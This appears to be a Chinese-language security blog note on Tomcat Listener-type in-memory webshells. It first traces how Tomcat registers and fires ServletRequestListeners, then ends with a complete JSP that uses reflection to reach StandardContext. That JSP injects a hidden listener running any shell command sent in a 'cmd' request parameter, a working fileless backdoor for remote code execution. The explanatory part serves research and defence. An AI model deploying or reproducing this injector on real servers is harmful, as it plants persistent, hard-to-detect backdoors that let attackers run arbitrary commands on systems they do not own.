---
created: '22/02/16'
title: Tomcat-Listener型内存马
tags:
  - java
  - java安全
  - 内存马
---
# Tomcat-Listener型内存马

## 参考文章
- http://wjlshare.com/archives/1651

## Tomcat-Listener
Listener（监听器）就是一个实现特定接口的普通java程序，这个程序专门用于监听另一个java对象的方法调用或属性改变，当被监听对象发生上述事件后，监听器某个方法将立即被执行。Listener常用于GUI应用程序中，我们的内存马主要涉及到的是**ServletRequestListener**(由于其在每次请求中都会触发)

## Listener流程分析
首先编写一个Listener并写入web.xml:
```java
package top.longlone.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class DemoListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("request init");
    }
}

```
```xml
 <listener>
    <listener-class>top.longlone.listener.DemoListener</listener-class>
  </listener>
```

然后我们在这个Listener的class部分和`requestInitialized()`下断点:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217143012.png)
开启调试触发断点，根据堆栈回溯找到`StandardContext.listenerStart()`方法，可以看到它先调用`findApplicationListeners()`获取Listener的名字，然后实例化:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217143453.png)
接着他会遍历results中的Listener，根据不同的类型放入不同的数组，我们这里的ServletRequestListener放入eventListeners数组中:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217143730.png)
接下来的操作是通过调用`getApplicationEventListeners()`获取applicationEventListenersList中的值，然后再设置applicationEventListenersList，可以理解为applicationEventListenersList加上刚刚实例化的eventListeners:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217144043.png)
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217144123.png)

接下来看第二个断点，根据调用堆栈我们找到了`fireRequestInitEvent()`方法，它会调用`getApplicationEventListeners()`并调用其中所有的`ServletRequestListener.requestInitialized()`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217144559.png)


## 内存马实现流程分析
根据上面的分析我们知道Listener来源于tomcat初始化时从web.xml实例化的Listener和applicationEventListenersList中的Listener，前者我们无法控制，但是后者我们可以控制，只需要往applicationEventListenersList中加入我们的恶意Listener即可。

实际上StandardContext存在`addApplicationEventListener()`方法可以直接给我们调用，往applicationEventListenersList中加入Listener。

所以我们的Listener内存马实现步骤:
- 继承并编写一个恶意Listener
- 获取StandardContext
- 调用`StandardContext.addApplicationEventListener()`添加恶意Listener

以下是代码的具体实现:
```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>

<%
    class S implements ServletRequestListener{
        @Override
        public void requestDestroyed(ServletRequestEvent servletServletRequestListenerRequestEvent) {

        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");
            if(cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {}
            }
        }
    }
%>

<%
    ServletContext servletContext =  request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    S servletRequestListener = new S();
    standardContext.addApplicationEventListener(servletRequestListener);
    out.println("inject success");
%>
```

